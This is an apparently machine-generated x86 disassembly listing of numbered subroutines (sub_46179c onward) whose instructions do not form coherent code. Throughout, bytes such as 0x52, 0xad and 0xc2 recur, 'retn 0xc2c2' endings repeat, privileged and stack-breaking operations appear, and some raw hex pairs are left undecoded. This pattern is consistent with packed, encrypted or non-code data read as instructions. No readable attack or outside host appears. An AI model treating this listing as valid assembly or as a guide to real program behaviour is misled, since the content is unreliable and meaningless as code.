dec edi
imul edx [ edx + 0x52 ] 0xffffffba
rcl [ esi + 0x52 ] 0x52
mov ebx 0x5252732f
lodsd [ esi ]
les edi [ esi - 0x44adadae ]
sub ebx [ ebx + 0x52 ]
push edx
retn 0xc2c2
sub_46179c
mov ebx 0xadadb8f5
retn 0xc2c2
sub_4617a4
retn 0xc2c2
sub_4617a9
ficom [ edx + 0x52 ]
push edx
mov ebx 0x5252423d
retn 0x4ad
sub_4617b5
pop ebp
in al 0x15
push esi
mov ebx 0x52525f17
retn 0x8aa5
sub_4617c2
dec ecx
xchg edx eax
movsd [ edi ] [ esi ]
mov bl [ ebx - 0x2c41266f ]
mov esi 0x525256de
mov ebx 0x5252420d
pop es
fnstcw [ esi + 0x4bacbb03 ]
push edx
push edx
retn 0x3b38
sub_4617e1
xor al 0xdb
pop ss
mov esp 0xbb72380a
pop esi
mov [ 0xffffffffd7dfadad ] eax
mov edx 0x2adadae
mov ebx 0x525269a6
retn 0x5d02
sub_4617fc
in eax 0x11
mov ebx 0x52526132
fild [ 0x76d6df54 ]
retn 0x5252
sub_461843
mov esi 0x172bed1
mov ebx 0xadada657
retn 0x5ad
sub_461850
push cs
mov ebx 0x52527d37
retn 0xc2c2
sub_461859
mov ebx 0x5252502a
retn 0xc2c2
sub_461861
retn 0x5dc2
sub_4618ae
dec esi
mov ebx 0xadada729
retn 0xc2c2
sub_4618b7
retn 0xc2c2
sub_4618ba
retn 0xdfc2
sub_4618fd
xchg [ esi + 0x52 ] ebx
push edx
retn 0xd1c2
sub_461904
xchg edx eax
push eax
mov ebx 0x52527a27
retn 0xbb02
sub_46190e
and [ eax - 0x3d3d5253 ] ch
retn 0xd6c2
sub_461918
pop ebp
xlat
retn 0x527d
sub_46191d
push edx
mov ebx 0x52527d67
retn 0xc2c2
sub_461926
retn 0xc2c2
sub_461929
retn 0xc2c2
sub_46192c
retn 0xd907
sub_461959
retn 0xc2c2
sub_46195c
retn 0x5dc2
sub_46195f
aad 0x51
push edx
push edx
push edx
rcl [ eax + 0x46db3472 ] 0x1
and edx [ ecx + ebp * 2 ]
mov [ 0xffffffffadbe1abb ] al
lodsd [ esi ]
retn 0xc2c2
sub_461976
retn 0xbac2
sub_4619a9
retn 0xc2c2
sub_4619ac
retn 0xd907
sub_4619db
add eax 0x5a7626ad
fldcw [ edx - 0x2ec9fa53 ]
stosb [ edi ]
lodsd [ esi ]
pop ebp
salc
sub [ ebx + 0x52 ] ebp
push edx
mov ebx 0x5252767e
retn 0x3638
sub_4619f6
xor al 0xdb
pop ss
mov ah 0xa
cmp [ edi ] dh
xor al 0xdb
pop ss
mov edx 0xbb3c380a
dec ecx
push ebx
push edx
push edx
retn 0xc2c2
sub_461a0c
fist [ edi ]
stosb [ edi ]
0x52525252 0xf05d
sub_461a33
retn 0xbbc2
sub_461a36
xchg edx eax
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_461a3d
retn 0xc2c2
sub_461a40
retn 0xc2c2
sub_461a43
mov ebx 0xadada2ea
retn 0xc2c2
sub_461a5d
xchg edx eax
or eax 0x526fd1bb
push edx
retn 0xc2c2
sub_461a67
retn 0x34c2
sub_461a6e
lea esi [ ebx + ebx * 8 ]
movhps xmm7 [ eax ]
and [ ecx ] cl
mov ebx 0x52526f87
retn 0x340a
sub_461a9a
add al 0xdf
xlat
push es
test eax 0x402adad
mov ebx 0x52527fcc
retn 0xd904
sub_461aab
xchg ebp eax
mov edx 0xadadbdd1
or ecx [ ebx ]
mov ebx 0x5252725a
retn 0xc2c2
sub_461abb
retn 0xc2c2
sub_461abe
retn 0x7c2
sub_461ac1
mov ebx 0x525247bb
retn 0xbc2
sub_461ade
retn 0x61c2
sub_461af4
mov ebx 0x52524dd1
retn 0xc2c2
sub_461afc
retn 0xc2c2
sub_461aff
retn 0xc2c2
sub_461b02
retn 0xc2c2
sub_461b05
retn 0xc2c2
sub_461b08
retn 0xc2c2
sub_461b0b
retn 0xdfc2
sub_461b0e
fild [ edx - 0x45525251 ]
loopne r-xdata
push edx
mov ebx 0xadadba56
retn 0x52bb
push edx
push edx
shr [ edx + 0x67dcbb12 ] 0x1
push edx
push edx
retn 0xc2c2
sub_461b23
retn 0xdb34
sub_461b87
retn 0xc2c2
sub_461b8a
imul edx [ edi ] 0xab80bb5a
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_461c05
push edx
retn 0xc2c2
sub_461c09
retn 0xc2c2
sub_461c0c
retn 0xc2c2
sub_461c0f
retn 0x92d7
sub_461c12
pop ebp

sub_461c14
xchg ebx eax
fst [ ebx + 0x526700bb ]
push edx
pop es
mov ebx 0x52524bae
retn 0x27ad
sub_461c25
mov [ 0x67edbb05 ] al
push edx
push edx
retn 0xc2c2
sub_461c68
retn 0xbb01
sub_461c6b
sbb bl [ ebp + 0x52 ]
push edx
retn 0xc2c2
sub_461c72
retn 0xc2c2
sub_461c75
retn 0xc2c2
sub_461c78
retn 0xc2c2
sub_461c7b
retn 0xc2c2
sub_461c81
sar [ esi + 0xa333842 ] 0x1
cmp [ ebx + edi * 4 ] ah
fdivr [ ecx - 0x3d3d5253 ]
retn 0xc2c2
sub_461c93
retn 0xc2c2
sub_461c96
retn 0xd9c2
sub_461c99
aam 0xee
push edx
push edx
push edx
mov ebx 0x52525df1
retn 0xc2c2
sub_461ca6
retn 0xc2c2
sub_461ca9
retn 0xc2c2
sub_461cac
mov ebx 0xadadbb4b
retn 0xc2c2
sub_461cb4
retn 0xc2c2
sub_461cb7
retn 0xc2c2
sub_461cba
popad
xchg edx eax
adc bl [ ebx - 0x3d3d3d6f ]
retn 0xc2c2
sub_461ccf
mov dl bh
mov [ ebp - 0x2a ] ebx
insd
test al 0xad
lodsd [ esi ]
cmp dh [ ecx ]
mov ch 0x59
retn
sub_461d0d
add [ ebx - 0x525248b1 ] bh
retn 0xc2c2
sub_461d16
retn 0xc2c2
sub_461d7a
pop ss
lodsd [ esi ]
add bh [ ebx - 0x5252549e ]
retn 0xc2c2
sub_461d85
retn 0x380a
sub_461d88
xor al 0x34
fist [ edi ]
stosb [ edi ]
or bh [ eax ]
jl r-xdata
retn 0x96d1
mov esi 0xc252524c
retn 0xc2c2
sub_461d99
retn 0xc2c2
sub_461d9c
retn 0x38c2
sub_461d9f
push esi
cmp dl [ edx + 0x62 ]
push edx
push edx
cmp dl [ edx + 0x53 ]
push edx
push edx
cmp [ edx - 0x45 ] dl
mov esp 0xc2525262
retn 0xc2c2
sub_461db5
retn 0xc2c2
sub_461db8
retn 0xc2c2
sub_461dbb
retn 0xc2c2
sub_461dbe
retn 0xc2c2
sub_461dc1
retn 0xc2c2
sub_461dc4
retn 0xc2c2
sub_461dc7
retn 0xc2c2
sub_461dca
retn 0xd65d
sub_461df7
retn 0xc2c2
sub_461dfa
retn 0xdb34
sub_461dfd
pop ss
mov edx 0x524811bb
push edx
xor al 0xdb
pop es
0xdb3482d9 0xe807
sub_461e2c
retn 0x7c2
sub_461e2f
fnstcw [ esi - 0x5258cb45 ]
lodsd [ esi ]
retn 0xc2c2
sub_461e57
retn 0xc2c2
sub_461e5a
retn 0xc2c2
sub_461e5d
retn 0x35ba
sub_461e81
popfd
pop ebp
in al dx
push 0xa3619d51
mov ebx 0xadadbe7f
retn 0xc2c2
sub_461e91
popad
xchg edx eax
adc bh [ ebx + 0x52524abe ]
retn 0xc2c2
sub_461e9c
retn 0xc2c2
sub_461e9f
retn 0xc2c2
sub_461ea2
retn 0xd9c2
sub_461ea5
xchg ebx eax
or eax 0x919b090c
pop ebp
xlat
and al 0x63
push edx
push edx
popad
xchg edx eax
or al 0x9
xchg ecx eax
retn 0xc2c2
sub_461eb9
retn 0xc2c2
sub_461ebc
retn 0xbc2
sub_461ebf
mov ebx 0x525243e5
retn 0xc2c2
sub_461ec7
retn 0xc2c2
sub_461eca
retn 0x4ad
sub_461f1e
retn 0xc2c2
sub_461f21
retn 0xc2c2
sub_461f24
retn 0xc2c2
sub_461f27
retn 0x38c2
sub_461f2a
cmp esi [ ebx + ebx * 8 ]
pop ds
mov esi 0x343c380b
fistp [ edi ]
mov esp 0x1fdb340b
mov [ 0x7c389ad9 ] al
xor al 0xdb
pop ds
mov al [ 0x574fbb0b ]
push edx
push edx
retn 0xc2c2
sub_461f4c
retn 0xc2c2
sub_461f4f
retn 0xc2c2
sub_461f52
retn 0xde5d
sub_461f7e
retn 0x523a
sub_461f81
push edx
inc edx
push edx
mov ebx 0x52524fa3
retn 0xd65d
sub_461fac
retn 0xd6ba
sub_461faf
mov ch 0xad
lodsd [ esi ]
mov ebx 0xadadb90b
retn 0xc2c2
sub_461fba
retn 0x2c2
sub_461fbd
mov ebx 0x52527267
retn 0xbac2
sub_461fc7
lodsd [ esi ]
lodsd [ esi ]
movsd [ edi ] [ esi ]
mov cl [ ecx - 0x6e ]
or edi [ ebx - 0x525243c8 ]
retn 0xc2c2
sub_461fd6
retn 0xc2c2
sub_461fd9
retn 0x9b61
sub_461fdc
xor al 0xdb
pop ds
lodsb [ esi ]
or edi [ ebx - 0x525244c5 ]
retn 0xeb03
sub_461fe9
bound edx [ edx + 0x52 ]
push edx
fst [ ss : ebx - 0x27 ]
adc bl [ esi - 0x27 ]
adc bl [ esi - 0x27 ]
push edx
fst [ edx ]
dec edx
fist [ esi + 0x76 ]
mov ebx 0x525253f1
retn 0xc2c2
sub_462006
retn 0xc2c2
sub_462009
retn 0xc2c2
sub_46200c
retn 0xc2c2
sub_46200f
rcl [ esi - 0x44adc7a2 ] 0x1
push edx
push dx
push edx
retn 0xc2c2
sub_46201c
retn 0xc2c2
sub_46201f
retn 0xc2c2
sub_462022
retn 0xc2c2
sub_462025
retn 0xc2c2
sub_462028
retn 0xc2c2
sub_46202b
or eax 0x5257d8bb
push edx
retn 0xc2c2
sub_462055
cmpsb [ esi ] [ edi ]
xor al 0x69
adc al 0x54
pop ebp
shl edi 0x1
mov ecx 0x17d9adad
adc cl 0x92
inc esi
mov ebx 0x525264c8
retn 0x92d7
sub_46207d
mov ebx 0x525252ce
retn 0xdfc2
sub_4620ab
mul edx
add eax 0xba5e14db
pshufw mm2 [ edx + 0x52 ] 0x3a
sbb ebx ecx
or esp 0x4214db05
mov edx 0x5252701d
mov ebx 0xadadaed6
retn 0xc2c2
sub_4620cd
retn 0x34c2
sub_4620cf
xor al 0xdb
pop ds
movsb [ edi ] [ esi ]
fstp [ edx - 0x55e024cc ]
or edi [ ebx + 0x525252b3 ]
retn 0xd65d
sub_462106
mov ebx 0xadada9bb
retn 0xc2c2
sub_46210e
retn 0xc2c2
sub_462111
retn 0xd7df
sub_462114
xchg esi eax
scasb [ edi ]
lodsd [ esi ]
lodsd [ esi ]
add bh [ ebx + 0x52525a9c ]
mov edx 0xadadbc09
mov ebx 0x525252d9
retn 0xc2c2
sub_46212b
retn 0xc2c2
sub_46212e
imul ebp [ edi ] 0xffffffae
pop ebp
salc
jo r-xdata
xchg ecx eax
retn 0xc2c2
push edx
push edx
add eax 0x17df5638
stosb [ edi ]
mov ebx 0x52526333
retn 0xc2c2
sub_462145
retn 0xc2c2
sub_462148
retn 0x3a0b
sub_46215d
retn 0xc2c2
sub_462160
retn 0xbac2
sub_462166
push edx
mov ebx 0x52524ec7
retn 0xd7c2
sub_46216f
xchg edx eax
mov ebx 0x52525f5c
retn 0xc2c2
sub_462178
or ebx [ ebx - 0x3d3d3d6f ]
retn 0xd8c2
sub_462186
lodsd [ esi ]
lodsd [ esi ]
mov edx 0x5252754f
or edx ecx
stosb [ edi ]
push eax
mov ebx 0xadadb59c
retn 0xc2c2
sub_462199
sar [ edx - 0x430044b0 ] 0x1
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_4621a4
retn 0xd9c2
sub_4621ae
mov edx 0xadada37e
fstp st7
0x2adadaf 0x50bb
stosb [ edi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xdb34
sub_4621c2
pop ds
test al 0xbb
mov dh 0x7d
push edx
push edx
retn 0xc2c2
sub_4621cc
retn 0xc2c2
sub_4621e8
mov [ ebp + 0x52 ] cs
push edx
retn 0xc2c2
sub_4621ef
retn 0xc2c2
sub_4621f2
retn 0xc2c2
sub_4621f5
retn 0xd2d9
sub_462250
popad
xchg edx eax
adc bl [ ebx - 0x3d3d3d6f ]
retn 0xd7c2
sub_462288
mov dl 0xda
pop ss
sbb dl 0x17
xchg edx eax
fistp [ edi ]
mov dh 0xdf
pop ss
not [ ebp + 0x419b617 ]
pop ds
sbb [ ebx + 0x525261f9 ] edi
retn 0xc2c2
sub_4622a4
retn 0xc2c2
sub_4622a7
retn 0xc2c2
sub_4622aa
fist [ edi ]
cmpsb [ esi ] [ edi ]
fist [ edi ]
cmpsb [ esi ] [ edi ]
add bh [ ebx - 0x52524bc0 ]
retn 0xd7c2
sub_4622b9
xchg edx eax
mov ebx 0xadadae99
retn 0xc2c2
sub_4622c2
retn 0x34c2
sub_4622e4
retn 0xc2c2
sub_4622e7
retn 0xc2c2
sub_4622ea
xor al 0xdb
pop ss
dec edx
or bh [ eax ]
aas
xor al 0xdb
pop ss
dec eax
or bh [ ebx + 0x52527cd7 ]
retn 0x9b61
sub_462300
cmpsb [ esi ] [ edi ]
fld [ ecx + eax * 4 - 0x59e85258 ]
rcl [ ebx + 0x4f06da5a ] 0x1
xchg esi eax
mov ebx 0xadadbc3d
retn 0xd65d
sub_462317
and [ ebx + 0x2bbbadad ] bh
lodsb [ esi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xd65d
sub_462367
or al 0x9
fnstenv [ edi - 0x52417b45 ]
lodsd [ esi ]
retn 0xc2c2
sub_462373
retn 0xc2c2
sub_462376
retn 0x9261
sub_462379
xchg ecx eax
retn 0xc2c2
sub_46237d
retn 0xc2c2
sub_462380
retn 0xc2c2
sub_462383
fst [ edi ]
scasb [ edi ]
pop ebp
in eax 0x56
adc ecx ebx
push esi
aad 0x51
pop ss
pop edx
mov ebx 0xadadb7c2
retn 0xc2c2
sub_462398
retn 0x5dc2
sub_46239b
xlat
leave
push eax
push edx
push edx
popad
xchg edx eax
mov ebx 0x52524be1
retn 0xc2c2
sub_4623aa
retn 0xc2c2
sub_4623ad
retn 0xc2c2
sub_4623b0
xlat
xchg edx eax
pop ebp
salc
mov dh 0xb0
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0x52525b9e
retn 0xc2c2
sub_4623c0
retn 0xc2c2
sub_4623c3
add [ 0x527799bb ] eax
push edx
retn 0x3ac2
sub_4623cd
push edx
bound edx [ edx + 0x52 ]
mov ebx 0x525259be
retn 0x9b61
sub_4623d9
shr [ edx + 0x54d6bbad ] 0x1
push edx
push edx
retn 0xd65d
sub_4623e4
xor [ ebx + 0x52 ] eax
push edx
cmp [ edx - 0x45 ] dl
adc al 0x43
push edx
push edx
retn 0xc2c2
sub_4623f2
retn 0x5d02
sub_4623f5
in al 0x55
add bh [ ebx + 0x52527d2b ]
retn 0x3409
sub_462426
retn 0x92d7
sub_462429
mov ebx 0xadadbeed
retn 0xadc2
sub_462431
vrsqrtss xmm2 xmm1 [ edx + 0x52 ]
mov ebx 0xadadb65a
retn 0x80ba
sub_46243e
dec esp
push edx
push edx
cmp bh [ edi + 0x1bc5460 ]
fcmovnbe st4
stosb [ edi ]
push edx
push edx
push edx
mov edx 0x52524c93
mov ebx 0xadada0e5
retn 0xc2c2
sub_46245a
retn 0xc2c2
sub_46245d
retn 0x5c2
sub_462460
add [ ebx - 0x525241d1 ] edi
xor al 0xdb
pop ds
cmpsb [ esi ] [ edi ]
fstp [ edx - 0x57e824cc ]
popad
xchg edx eax
cmp [ edx ] ch
mov ebx 0xadadb4b6
retn 0xbb05
sub_46247c
mov ebx 0x61adadb0
xchg edx eax
or eax 0x919b090c
retn 0xc2c2
sub_46248a
retn 0xc2c2
sub_46248d
retn 0xc2c2
sub_462490
retn 0xc2c2
sub_462493
retn 0x14ba
sub_462496
mov esp 0x9261adad
adc bh [ ebx + 0x52524e03 ]
retn 0xd75d
sub_4624a4
aad 0xb4
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0xadadb429
retn 0x3138
sub_4624bc
xor al 0xdb
pop ds
mov eax 0xf1bb9ad9
jo r-xdata
and al 0x79
push edx
push edx
retn 0xc2c2
push edx
retn 0xc2c2
sub_4624ca
retn 0x3ac2
sub_4624cd
cmpsb [ esi ] [ edi ]
push ebx
push edx
push edx
lodsd [ esi ]
add eax 0x7626ad5a
pop edx
lodsd [ esi ]
add eax 0x7cd3bb7e
push edx
push edx
retn 0xc2c2
sub_4624e3
mov ebx 0x525276cd
retn 0xc2c2
sub_4624eb
retn 0xc2c2
sub_4624ee
retn 0xc2c2
sub_4624f1
retn 0xbb02
sub_4624f4
stc
pop eax
push edx
push edx
add [ edx ] eax
mov ebx 0x525248f8
retn 0xc2c2
sub_462502
retn 0xadc2
sub_46251f
retn 0x5dba
sub_462522
dec eax
push edx
push edx
xlat
xchg edx eax
mov ebx 0xadadac74
retn 0x3ac2
sub_46252f
aam 0xa1
daa
add eax 0xbb1a0cdb
cmp [ edi + 0x52 ] bl
push edx
retn 0xc2c2
sub_46253f
retn 0xc2c2
sub_462542
retn 0xdfc2
sub_462548
sar [ esi + 0x525252ca ] cl
add [ eax - 0x44f2ddc8 ] eax
add eax [ edx + edx * 2 + 0x52 ]
retn 0x6b34
sub_46255c
adc [ ebx * 2 + 0x5251a7d6 ] edx
push edx
in eax dx
0x6b525259 0x7616
sub_462591
retn 0xc2c2
sub_462594
retn 0xc2c2
sub_462597
retn 0xc2c2
sub_46259a
retn 0xc2c2
sub_46259d
retn 0xc2c2
sub_4625a0
retn 0xc2c2
sub_4625a3
retn 0xc2c2
sub_4625a6
retn 0xc2c2
sub_4625a9
retn 0xc2c2
sub_4625ac
retn 0xc2c2
sub_4625af
retn 0xc2c2
sub_4625b2
retn 0xc2c2
sub_4625b5
retn 0xc2c2
sub_4625b8
retn 0xc2c2
sub_4625bc
xchg ecx eax
retn 0xc2c2
sub_4625cb
mov edx 0xadad8e63
mov ebx 0x525243bc
retn 0x505
sub_4625ed
fst [ ebx + edi * 4 - 0x5252704b ]
shr [ ebp - 0x49264481 ] 0x1
lodsd [ esi ]
lodsd [ esi ]
retn 0x34c2
sub_4625ff
fistp [ edi ]
mov eax 0xab73bb0b
lodsd [ esi ]
lodsd [ esi ]
pop es
mov ebx 0xadadb91b
retn 0xc2c2
sub_462611
retn 0xd734
sub_462615
mov ebx 0x52527037
retn 0xc2c2
sub_46261d
popad
fwait
adc edi [ ecx - 0x66 ]
add eax 0x5e762ed9
fild [ esi + 0x53 ]
shl [ eax + 0x6846d85d ] 0x1
mov ebx 0x5252429f
retn 0xc2c2
sub_462638
retn 0xc2c2
sub_46263b
fstp st7
sub [ edi + 0x102adad ] 0xdb
out 0x82 eax
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
lodsd [ esi ]
add eax 0x4038bb42
push edx
push edx
retn 0xd7c2
sub_462655
pop ebp
fdiv [ esp + ecx * 4 - 0x53 ]
lodsd [ esi ]
mov ebx 0xadad8fab
retn 0xdb34
sub_4626d5
retn 0xc2c2
sub_4626d8
retn 0x1795
sub_4626db
mov esi 0x4191f04
mov ebx 0x5252556d
retn 0x38c2
sub_4626e8
inc edx
fist [ edi ]
mov es [ ecx ]
add bh [ edx + 0x52524268 ]
mov ebx 0xadadbebe
retn 0x12bb
sub_4626fb
inc ecx
push edx
push edx
retn 0xc2c2
sub_462702
retn 0xc2c2
sub_462704
retn 0xc2c2
sub_462707
retn 0xd9c2
sub_46270a
test [ ebx - 0x52524174 ] bh
pop es
fnstcw [ esi + 0x5002bed3 ]
push edx
push edx
add eax 0xadae7bbb
lodsd [ esi ]
retn 0xc2c2
sub_462722
add [ ebp + 0x5252d2c4 ] ebp
push edx
mov ebx 0x525271b2
retn 0xc2c2
sub_462731
retn 0xc2c2
sub_462785
retn 0xc2c2
sub_462788
retn 0xc2c2
sub_46278b
cmp dl [ edx + 0x62 ]
push edx
push edx
cmp dl [ edx + 0x42 ]
push edx
push edx
mov ebx 0x5252525d
xlat
xchg edx eax
mov ebx 0x52527fc9
retn 0xc2c2
sub_4627a4
retn 0xc2c2
sub_4627a7
retn 0x1c2
sub_4627aa
lodsd [ esi ]
vrsqrtss xmm2 xmm5 [ edx + 0x52 ]
add bh [ ebx + 0x525242a2 ]
retn 0xdfc2
sub_462812
retn 0xbbc2
sub_462815
outsd
pop eax
push edx
push edx
retn 0xc2c2
sub_46281c
retn 0xc2c2
sub_46281f
retn 0xd7c2
sub_462825
bound eax [ edx + 0x52 ]
push edx
imul ebp [ edi ] 0xffffffaa
mov ebx 0xadada9b7
retn 0xc2c2
sub_462834
add al 0xbb
mov esi [ edi - 0x3d3d5253 ]
retn 0xc2c2
sub_4628a5
pop es
xchg edx eax
or [ eax ] bh
sub dh [ ebx + ebx * 8 ]
pop es
nop
or [ eax ] bh
and al 0xbb
pop esp
test al 0xad
lodsd [ esi ]
retn 0xdb34
sub_4628ee
retn 0xc2c2
sub_4628f1
retn 0xc2c2
sub_4628f4
cmp [ esi + 0x3a ] dl
push edx
bound edx [ edx + 0x52 ]
lodsd [ esi ]
daa
pop esi
cmp [ edx - 0x53 ] dl
retn 0x52d2
sub_46291e
mov bh 0xad
lodsd [ esi ]
retn 0xbb02
sub_46294b
retn 0xc2c2
sub_46294e
retn 0xc2c2
sub_462951
retn 0xc2c2
sub_462954
retn 0xad05
sub_462963
test eax 0xd134adad
sub [ edx + edx * 2 ] edx
fild [ esi + 0x51 ]
mov ebx 0x52524851
retn 0xc2c2
sub_462976
retn 0xc2c2
sub_462979
retn 0xc2c2
sub_46297c
xor al 0xdb
pop es
idiv [ edx + 0x52525174 ]
or ecx [ ebx ]
or eax 0x44bb92d7
mov [ ebp - 0x263d3d53 ] gs
mov [ ebx + 0x52527b6d ] bh
retn 0x95c2
sub_4629b0
retn 0x5238
sub_4629b3
add bh [ edx + 0x52525f26 ]
fst [ edi ]
inc edx
shl [ edi ] 0x1
stosb [ edi ]
push edx
mov ebx 0xadada418
retn 0xba05
sub_4629e7
retn 0xc2c2
sub_4629ea
retn 0xbac2
j_sub_462a3b
jmp sub_462a3b
sub_4629ef
push edx
push edx
adc al [ edx ]
mov ebx 0xadad8aa7
retn 0xdb34
sub_4629fb
pop es
adc cl bl
mov ecx [ eax ]
xor al 0xdb
lfs esi [ ebx + ebx * 8 ]
das
movsb [ edi ] [ esi ]
mov ebx 0x52527ace
retn 0xc2c2
sub_462a10
xor al 0xdb
pop ss
xchg [ edx ] cl
mov ebx 0x52525953
retn 0xc2c2
sub_462a1d
retn 0xc2c2
sub_462a20
xor al 0xdb
inc edx
xor al 0xd7
cmp [ ebx - 0x525270c3 ] 0xc2
retn 0xdb34
sub_462a2f
pop ds
cli
add al 0xdf
fstp st6
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
xor al 0xdb
das
sub_462a3b
les esi [ ebx + ebx * 8 ]
pslld mm7 [ ebx - 0x5252529b ]
retn 0xc2c2
sub_462a48
retn 0x1fdf
sub_462a4b
scasb [ edi ]
add edi [ ebx - 0x5252570e ]
retn 0xc2c2
sub_462a67
xchg ebx eax
mov ebx 0x525252da
retn 0xd813
sub_462a70
inc ebx
mov ebx 0x52527f18
retn 0xc2c2
sub_462a7a
xchg ecx eax
retn 0xc2c2
sub_462a7e
retn 0xc2c2
sub_462a81
retn 0xc2c2
sub_462ac1
xlat
salc
test eax 0xd902adad
pop ss
pop edx
mov ebx 0x52524e42
pop es
fnstcw [ esi - 0x52488945 ]
lodsd [ esi ]
retn 0xd75d
sub_462af1
retn 0xc2c2
sub_462af4
retn 0xabd9
sub_462af7
fstp st7
0xbaadadaf 0xb5b4
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0xadadb8cf
retn 0xc2c2
sub_462b0a
retn 0xc2c2
sub_462b0d
retn 0xd9c2
sub_462b10
pop edx
push ecx
pop ds
pop edx
fst [ edx ]
stosb [ edi ]
mov ebx 0x5252741a
retn 0xd75d
sub_462b1f
or [ edx + edx * 2 + 0x52 ] 0xffffffbb
mov ch 0x8a
lodsd [ esi ]
lodsd [ esi ]
retn 0xbb07
sub_462b2b
fisttp [ ebp + 0x52 ]
push edx
retn 0x45ad
sub_462b32
mov ebx 0x52525643
retn 0xc2c2
sub_462b3a
mov edx 0x52524485
mov ebx 0x525275e0
retn 0xaad9
sub_462b47
fst [ edx + edi * 4 + 0x525273a7 ]
shr [ edx + 0x56d75d53 ] 0x1
mov [ 0xffffffffbb01adad ] al
stosb [ edi ]
mov ebp 0xc2c2adad
retn 0xc2c2
sub_462b62
retn 0xc2c2
sub_462b65
retn 0x2c2
sub_462b9d
retn 0xc2c2
sub_462ba0
retn 0xc2c2
sub_462ba3
retn 0xc2c2
sub_462ba6
retn 0xc2c2
sub_462ba9
mov ebx 0x52525cf6
retn 0xc2c2
sub_462bb1
retn 0xc2c2
sub_462bb4
retn 0xc2c2
sub_462c27
retn 0xc2c2
sub_462c2a
popad
movsb [ edi ] [ esi ]
imul edx [ ecx + 0x5344d45d ] 0xe55d5252
inc esi
and edx ecx
nop
adc cl 0xa8
pop ebx
mov ebx 0x525252aa
retn 0xc2c2
sub_462c46
fstpnce st4
xchg edx eax
push edx
push edx
push edx
mov ebx 0xadad8a30
retn 0xc2c2
sub_462c54
retn 0xc2c2
sub_462c57
retn 0xc2c2
sub_462c5a
retn 0xc2c2
sub_462c5d
fst [ edx - 0x27 ]
push edx
fst [ edx ]
dec edx
fist [ esi + 0x76 ]
fst [ esi + 0x76 ]
or edx [ ecx - 0x3d3d3d3e ]
fist [ edi ]
scasb [ edi ]
mov ebx 0xadadab01
retn 0xc2c2
sub_462c7b
retn 0xc2c2
sub_462c7e
retn 0xc2c2
sub_462c81
retn 0xc2c2
sub_462c84
retn 0xc2c2
sub_462c87
retn 0xd1c2
sub_462c8a
xchg esp eax
push eax
xor al 0xd1
insb
push edx
pop ebp
xlat
mov bh 0x87
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0xadadb88d
retn 0x9ad9
sub_462c9e
fstp st7
sub ch [ edi - 0x72445253 ]
jno r-xdata
rol [ ecx + 0x52 ] 0x52
retn 0xc2c2
push edx
retn 0x7c2
sub_462cda
retn 0xd907
sub_462cdd
mov esi 0x10abed1
popad
xchg edx eax
add al 0x5
fist [ edi ]
scasb [ edi ]
fist [ edi ]
stosb [ edi ]
fist [ edi ]
cmpsb [ esi ] [ edi ]
0x12525252 0xf05d
sub_462cf6
fisttp [ edi ]
scasb [ edi ]
mov ebx 0x525241c0
retn 0xc2c2
sub_462d01
retn 0xc2c2
sub_462d04
retn 0xd65d
sub_462d07
adc ebp [ ecx - 0x59445253 ]
mov eax 0xc2c2adad
retn 0xc2c2
sub_462d15
retn 0xbac2
sub_462d18
inc ebx
pop eax
push edx
push edx
mov ebx 0x52524478
retn 0xc2c2
sub_462d24
retn 0xc2c2
sub_462d27
retn 0xc2c2
sub_462d2a
retn 0x380a
sub_462d2d
xor eax 0xbe17db34
or bh [ eax ]
aaa
mov ebx 0xadadbcf7
retn 0xd55d
sub_462d3d
0x14525248 0xa269
sub_462d57
retn 0x34c2
sub_462d5a
fist [ edi ]
movsb [ edi ] [ esi ]
popad
xchg edx eax
cmp [ esi + 0x34 ] al
fist [ edi ]
stosb [ edi ]
xor al 0xdb
pop ds
mov esp 0x5246c8bb
push edx
retn 0x51bb
sub_462d71
dec ebx
push edx
push edx
retn 0xc2c2
sub_462d77
retn 0xc2c2
sub_462d7a
retn 0xdfdf
sub_462df0
retn 0xc2c2
sub_462df3
retn 0x9bc2
sub_462df6
xchg ecx eax
retn 0x7238
sub_462dfa
mov ebx 0xadadb12a
retn 0xc2c2
sub_462e0e
retn 0xc2c2
sub_462e11
retn 0xd907
sub_462e48
mov eax 0xc2c2adad
retn 0xc2c2
sub_462e50
retn 0xc2c2
sub_462e53
retn 0x2c2
sub_462e56
mov ebx 0x52527703
add eax 0x563aaad9
push ebx
push edx
push edx
fstp st7
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
add ah [ ecx - 0x5c ]
mov ebx 0x525245cb
retn 0xc2c2
sub_462e74
retn 0xdb34
sub_462e79
fldenv [ edi ]
pop edx
add bh [ ebx - 0x52525607 ]
retn 0xd75d
sub_462e86
cmpsb [ esi ] [ edi ]
lodsd [ esi ]
lodsd [ esi ]
fist [ edi ]
push cs
add bl cl
xchg esp eax
mov ebx 0xadadb414
retn 0xc2c2
sub_462e97
pop es
mov ebx 0xadada4f5
retn 0xc2c2
sub_462ea0
retn 0xc2c2
sub_462ea3
retn 0xd0bb
sub_462ea6
dec ebp
push edx
push edx
retn 0xc2c2
sub_462f0f
retn 0xc2c2
sub_462f12
retn 0xc2c2
sub_462f15
retn 0xc2c2
sub_462f18
retn 0x51c2
sub_462f48
or al 0x9
fwait
xchg ecx eax
retn 0xc2c2
sub_462f4f
retn 0x9b09
sub_462f52
xchg ecx eax
retn 0xc2c2
sub_462f56
retn 0xdbc2
sub_462f59
das
stosb [ edi ]
mov ebx 0xadadba15
retn 0xc2c2
sub_462f63
xlat
xchg edx eax
mov ebx 0xadad87cf
retn 0xc2c2
sub_462f6d
pop ebp
salc
aam 0x4a
push edx
push edx
imul ebx [ ecx + 0x4a2cd65d ] 0x18ba5252
dec esi
push edx
push edx
imul edx [ ecx - 0x5256f145 ] 0xc2c2c2ad
retn 0xdb34
sub_462f8d
pop ss
cmpsb [ esi ] [ edi ]
or dh [ ebx + ebx * 8 ]
pop ss
movsb [ edi ] [ esi ]
popad
xchg edx eax
cmp [ esi ] dl
mov ebx 0x52525dd1
mov ebx 0x5252422c
retn 0x27ad
sub_462fa5
